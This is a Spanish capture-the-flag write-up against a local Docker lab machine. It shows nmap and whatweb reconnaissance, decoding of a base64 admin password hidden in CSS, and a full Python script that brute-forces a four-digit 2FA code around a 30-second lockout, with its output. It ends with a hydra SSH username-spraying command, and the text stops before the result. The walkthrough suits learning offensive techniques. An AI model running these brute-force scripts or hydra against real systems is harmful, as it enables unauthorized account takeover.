
##FASE DE RECONOCIMIENTO
Después de desplegar el docker, la IP que nos muestra para la máquina es: 172.17.0.2

Vamos a realizar un scaneo de los puertos para ver cuales tiene abiertos y que servicios corren por ellos así como sus versiones:
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
Desglose de opciones:
-sudo Ejecuta con privilegios elevados para acceder a más información

-nmap Herramienta para escanear puertos y servicios

-sS Escaneo SYN rápido y discreto

-sCV Combina

-sC Ejecuta scripts predeterminados

-sV Detecta versiones de servicios

-Pn Omite el ping previo

-min-rate 5000 Fija una tasa mínima de 5000 paquetes por segundo

-p Escanea todos los puertos del 1 al 65535

-vvv Muestra detalles verbosos

-open Muestra solo puertos abiertos

-172 17 0 2 IP del objetivo

-oN PuertosYservicios Guarda el resultado en el archivo PuertosYservicios


Me arroja este resultado:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:c3:e7:47:85:79:ce:e9:e6:1f:dd:43:37:9b:aa:a5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD3OXUTsS/7EOODKcuxhghzwJQOp/JfH4v7ihKhkH4EMDtOCvyHvi1nO3HSZtsR3r5fuzrox1LzFwlu8mas25QU=
|   256 4d:80:5f:fa:24:fa:c3:70:fc:bd:39:d8:e7:5b:c7:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN1X+NtUxcqV44+PcJo1OeyS+fWcgrxKcFUyHsu5JdsA
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

-El puerto 22 con ssh en una versión no vulnerable, pero sin user ni pass no podemos hacer nada

-puerto 80 http, nos centraremos en esto

me gusta lanzar un whatweb para ver un poquito que nos vamos a encontrar y que funciona en esa maquina:
```bash
whatweb http 172 17 0 2  tee whatweb
```
Desglose: 
-whatweb Herramienta de reconocimiento web que identifica tecnologías utilizadas en un sitio

-http 172 17 0 2 Dirección IP o URL objetivo

-pipe (|): Redirige la salida del comando whatweb

-tee whatweb Muestra la salida en pantalla y guarda una copia en el archivo whatweb

Por lo que muestra en la salida creo que es la página que trae un servidor apache por defecto, la abrimos en el navegador.
Con ctrl+u vemos el código fuente y buscamos si hay algo extrano:
y vemos esto:
```
div.page_header {
    height: 180px;
    width: 100%;

    background-color: #F5F6F7;
    background-color: UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU;
```
y también esto:
```
 <div class="validator" hidden="lifeordead.dl">
```
y por supuesto:
```
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
|
|-- admin
```
lo primero que hago es añadir el subdomino al /etc/hosts
```bash
sudo nano /etc/hosts
```
y añadimos al final
```
172.17.0.2      lifeordead.dl
```
 ahora nos centraremos en lo otro que vimos: UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU

 lanzamos un decode de base 64:
 ```
echo "UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU" | base64 -d;echo
```
```
PASSWORDADMINSUPERSECRET
```

Tenemos un password... y un user admin:PASSWORDADMINSUPERSECRET y un subdomino, pues vamos y veamos que nos encontramos, vamos a http://lifeordead.dl/
No vemos nada en el codigo fuente (mira que habría apostado que habría algo), nos centramos en el login, tenemos un user y un pass. lo metemos y nos manda a un
segundo factor de autentificación...hago un script chapucero pero al ver las solicitudes y respuestas veo :
```
{"status":"failed","attempts":9,"remainingTime":0}
```
tenemos 10 oportunidades en attemts el status failed nos indica que no es correcto nuestroo numero y amigo, no podia ser todo facil,
un bloqueo que lo controlamos cn remainingTime de 30 segundos, así que me monto un script en Python:
```bash
import requests
import time

# URLs y cabeceras
login_url = "http://lifeordead.dl/"
auth_code_url = "http://lifeordead.dl/pageadmincodeloginvalidation.php"
session_cookies = {"PHPSESSID": "hroh08qkr9ls38t502sghuhtlh"}  # Asegúrate de obtener la cookie válida

headers_login = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": login_url,
}

headers_2fa = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Content-Type": "multipart/form-data; boundary=---------------------------81801669239445811504259151272",
    "Referer": "http://lifeordead.dl/pageadmincodelogin.html",
}

# Datos para login inicial
login_data = "username=admin&password=PASSWORDADMINSUPERSECRET"

# Intentar login
print("[+] Realizando login inicial...")
response = requests.post(login_url, headers=headers_login, data=login_data, cookies=session_cookies)

if response.status_code == 200:
    print("[+] Login inicial completado.")
else:
    print("[-] Error en el login inicial. Status Code:", response.status_code)
    exit()

# Ataque al segundo factor
for code in range(0, 10000):
    code_str = f"{code:04d}"  # Formato de 4 dígitos, ej. 0001
    form_data = f"-----------------------------81801669239445811504259151272\r\nContent-Disposition: form-data; name=\"code\"\r\n\r\n{code_str}\r\n-----------------------------81801669239445811504259151272--"

    print(f"[+] Probando código: {code_str}")
    response = requests.post(auth_code_url, headers=headers_2fa, data=form_data, cookies=session_cookies)

    # Procesar respuesta
    try:
        result = response.json()
        status = result.get("status")
        attempts = result.get("attempts", 0)
        remaining_time = result.get("remainingTime", 0)

        if status == "success":
            print(f"[+] Código correcto encontrado: {code_str}")
            break

        print(f"[-] Código incorrecto. Intentos restantes: {attempts}. Tiempo restante: {remaining_time}s")

        # Esperar si remainingTime es mayor que 0
        if remaining_time > 0:
            print(f"[!] Bloqueado. Esperando {remaining_time} segundos...")
            time.sleep(remaining_time + 1)  # Espera más de lo indicado para asegurar desbloqueo

    except ValueError:
        print("[-] Error procesando la respuesta del servidor.")
        continue

print("[+] Ataque finalizado.")
```

lo ejecutamos y...
```
+] Probando código: 0067
[-] Código incorrecto. Intentos restantes: 1. Tiempo restante: 0s
[+] Probando código: 0068
[-] Código incorrecto. Intentos restantes: 10. Tiempo restante: 30s
[!] Bloqueado. Esperando 30 segundos...
[+] Probando código: 0069
[-] Código incorrecto. Intentos restantes: 9. Tiempo restante: 0s
[+] Probando código: 0070
[-] Código incorrecto. Intentos restantes: 8. Tiempo restante: 0s
[+] Probando código: 0071
[-] Código incorrecto. Intentos restantes: 7. Tiempo restante: 0s
[+] Probando código: 0072
[-] Código incorrecto. Intentos restantes: 6. Tiempo restante: 0s
[+] Probando código: 0073
[-] Código incorrecto. Intentos restantes: 5. Tiempo restante: 0s
[+] Probando código: 0074
[-] Código incorrecto. Intentos restantes: 4. Tiempo restante: 0s
[+] Probando código: 0075
[-] Código incorrecto. Intentos restantes: 3. Tiempo restante: 0s
[+] Probando código: 0076
[-] Código incorrecto. Intentos restantes: 2. Tiempo restante: 0s
[+] Probando código: 0077
[-] Código incorrecto. Intentos restantes: 1. Tiempo restante: 0s
[+] Probando código: 0078
[-] Código incorrecto. Intentos restantes: 10. Tiempo restante: 30s
[!] Bloqueado. Esperando 30 segundos...
[+] Probando código: 0079
[-] Código incorrecto. Intentos restantes: 9. Tiempo restante: 0s
[+] Probando código: 0080
[-] Código incorrecto. Intentos restantes: 8. Tiempo restante: 0s
[+] Probando código: 0081
[+] Código correcto encontrado: 0081
[+] Ataque finalizado.
```

Bueno 0081, pues vamos a ver que nos encontramos
nos manda a 
```
http://lifeordead.dl/supermegasecretcodeadmin.php
```
y nos dá el siguiente código:
```
bbb2c5e63d2ef893106fdd0d797aa97a
```
probé varios desencriptados y no era posible o no era reconocido, así pues lo doy como un pass, tenemos un pass y un ssh, vamos a hydra:
```bash
hydra -t 64 -L /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -p bbb2c5e63d2ef893106fdd0d797aa97a ssh://172.17.0.2 -V -F -I
```
Después de un buen rato:



